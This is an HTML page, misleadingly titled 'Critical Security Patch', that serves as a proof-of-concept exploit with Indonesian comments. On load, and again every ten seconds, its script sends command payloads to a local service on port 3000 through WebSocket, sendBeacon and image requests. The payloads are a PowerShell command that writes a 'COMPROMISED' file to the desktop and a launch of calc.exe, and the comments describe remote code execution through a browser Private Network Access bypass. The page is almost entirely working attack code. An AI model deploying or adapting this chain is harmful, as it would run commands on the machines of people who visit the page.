<!DOCTYPE html>
<html>
<head>
    <title>Critical Security Patch</title>
</head>
<body style="background:black; color:#0f0; font-family:monospace; text-align:center; padding-top:100px;">
    <h1>SYSTEM ISOLATION BREACH TEST</h1>
    <div id="logs" style="text-align:left; display:inline-block; width:80%;"></div>

    <script>
        const log = (m) => document.getElementById('logs').innerHTML += `> ${m}<br>`;
        
        // Payload: Menulis file ke desktop menggunakan PowerShell
        // Kami menggunakan PowerShell karena sangat kuat untuk membuktikan dampak RCE
        const filePayload = 'powershell -Command "Set-Content -Path $env:USERPROFILE\\Desktop\\VULNERABLE.txt -Value \'THIS SYSTEM IS COMPROMISED VIA CHROME PNA BYPASS. DATE: \' (Get-Date)"';
        const calcPayload = 'calc.exe';

        async function inject() {
            const targets = ["127.0.0.1", "0.0.0.0", "localhost"];
            
            targets.forEach(ip => {
                log(`Testing Shadowing on ${ip}...`);

                // 1. WebSocket Injection (Primary)
                try {
                    const ws = new WebSocket(`ws://${ip}:3000`);
                    ws.onopen = () => {
                        log(`[!] WS CONNECTED: Injecting txt file via ${ip}...`);
                        ws.send(filePayload); // Kirim perintah tulis file
                        ws.send(calcPayload); // Kirim perintah buka kalkulator
                    };
                } catch(e){}

                // 2. Beacon Injection (Secondary)
                navigator.sendBeacon(`http://${ip}:3000/exec?cmd=${encodeURIComponent(filePayload)}`);

                // 3. Image Backup
                new Image().src = `http://${ip}:3000/exec?cmd=${encodeURIComponent(calcPayload)}`;
            });
        }

        window.onload = () => {
            log("Starting exploit chain...");
            inject();
            // Loop untuk memastikan race condition menang
            setInterval(inject, 10000);
        };
    </script>
</body>
</html>
